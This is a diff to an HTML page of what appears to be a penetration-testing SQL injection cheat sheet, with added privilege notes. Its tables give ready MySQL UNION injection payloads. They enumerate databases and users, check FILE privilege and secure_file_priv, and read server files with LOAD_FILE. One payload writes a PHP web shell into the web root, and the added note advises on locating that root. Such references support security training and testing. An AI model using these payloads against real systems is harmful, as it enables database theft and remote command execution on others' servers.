@@ -744,6 +744,21 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Privileges">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#write-file-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Write File Privileges
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -1495,6 +1510,21 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Privileges">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#write-file-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Write File Privileges
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -1887,7 +1917,7 @@ $result = $conn-&gt;query($query);
 </tbody>
 </table>
 <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Payload all the things: authentication bypass section</a></p>
-<p><strong>Note:</strong>  Line comments with -- or #, in-line comment with /**/.</p>
+<p><strong>Note:</strong>  Line comments with <code>--</code> or <code>#</code>, in-line comment with <code>/**/</code>.</p>
 <h3 id="union-injection">Union Injection</h3>
 <p><a href="https://dev.mysql.com/doc/refman/8.0/en/union.html">Union Clause</a></p>
 <table>
@@ -1961,12 +1991,12 @@ $result = $conn-&gt;query($query);
 </thead>
 <tbody>
 <tr>
-<td><code>cn' UNION select 1,database(),2,3-- -</code></td>
+<td><code>cn' UNION select 1,database(),3,4-- -</code></td>
 <td>Current database name</td>
 </tr>
 <tr>
 <td><code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td>
-<td>List all databases</td>
+<td>List all databases (mysql, information_schema and performance_schema are default MySQLdatabases )</td>
 </tr>
 <tr>
 <td><code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code></td>
@@ -1992,23 +2022,30 @@ $result = $conn-&gt;query($query);
 </thead>
 <tbody>
 <tr>
-<td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code></td>
+<td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code> or <code>cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -</code></td>
 <td>Find current user</td>
 </tr>
 <tr>
 <td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</code></td>
-<td>Find if user has admin privileges</td>
+<td>Find if "root" user has admin privileges</td>
 </tr>
 <tr>
 <td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -</code></td>
-<td>Find if all user privileges</td>
+<td>Show all of the "root" user's privileges, "FILE" privilege allows the user to read files</td>
 </tr>
 <tr>
 <td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</code></td>
-<td>Find which directories can be accessed through MySQL</td>
+<td>Find which directories can be accessed through MySQL. If "variable_value" is empty then we can read/write files to any location</td>
 </tr>
 </tbody>
 </table>
+<h4 id="write-file-privileges">Write File Privileges</h4>
+<p>To be able to write files to the back-end server using a MySQL database, we require three things:</p>
+<ul>
+<li>User with FILE privilege enabled</li>
+<li>MySQL global secure_file_priv variable not enabled</li>
+<li>Write access to the location we want to write to on the back-end server</li>
+</ul>
 <h3 id="file-injection">File Injection</h3>
 <table>
 <thead>
@@ -2023,15 +2060,20 @@ $result = $conn-&gt;query($query);
 <td>Read local file</td>
 </tr>
 <tr>
-<td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td>
+<td><code>cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -</code></td>
+<td>Another read local file example, useful to see how backend queries are handled</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -</code></td>
 <td>Write a string to a local file</td>
 </tr>
 <tr>
-<td><code>cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -</code></td>
+<td><code>cn' UNION SELECT "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -</code></td>
 <td>Write a web shell into the base web directory</td>
 </tr>
 </tbody>
 </table>
+<p><strong>Note:</strong> Web shells must be written to the base web directory for the web server (i.e. web root). Use load_file to read the server configuration at /etc/apache2/apache2.conf, /etc/nginx/nginx.conf or %WinDir%\System32\Inetsrv\Config\ApplicationHost.config are a few examples. Could also run a fuzzing scan and try to write files to different possible web roots, using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">Linux wordlist</a> or <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">Windows wordlist</a>. We can also use server errors to possibly display the web root.</p>
 
 
 
